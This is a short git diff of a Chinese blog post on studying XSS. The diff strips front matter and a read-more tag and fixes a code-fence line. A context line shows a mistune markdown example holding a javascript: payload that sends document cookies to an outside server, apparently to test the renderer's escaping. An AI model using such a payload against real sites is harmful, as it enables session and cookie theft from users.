@@ -1,13 +1,4 @@
----
-title: XSS学习
-date: 2019-03-20 09:55:20
-tags:
-- XSS
-- CSP
-- 同源策略
----
 简单的学习并归纳下XSS的学习。涉及到同源策略，跨域，CSP，HTML渲染过程，CSRF和XSS区别，防护以及一些实践的分析。
-<!--more-->
 
 
 # 前置知识
@@ -336,7 +327,7 @@ import mistune
 renderer = mistune.Renderer(escape=True, hard_wrap=True)
 markdown = mistune.Markdown(renderer=renderer)
 markdown("<javascript:document.location='hello.myserver.com/?cookie='+document.cookies>");
-``` 
+```
 
 ### mermaid
 **版本**：？？？
